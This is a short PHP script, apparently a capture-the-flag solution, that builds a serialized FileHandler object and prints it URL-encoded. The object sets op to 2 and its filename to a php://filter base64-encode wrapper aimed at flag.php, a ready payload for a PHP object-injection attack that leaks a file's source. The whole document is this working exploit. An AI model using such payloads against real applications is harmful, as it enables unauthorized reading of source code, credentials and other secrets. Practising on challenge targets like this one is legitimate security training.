<?php
class FileHandler{
    protected $op;
    protected $filename;
    protected $content;
    public function __construct(){
        $this->op=2;
        $this->filename="php://filter/convert.base64-encode/resource=flag.php";
    }
}
$a=new FileHandler;
echo(urlencode(serialize($a)));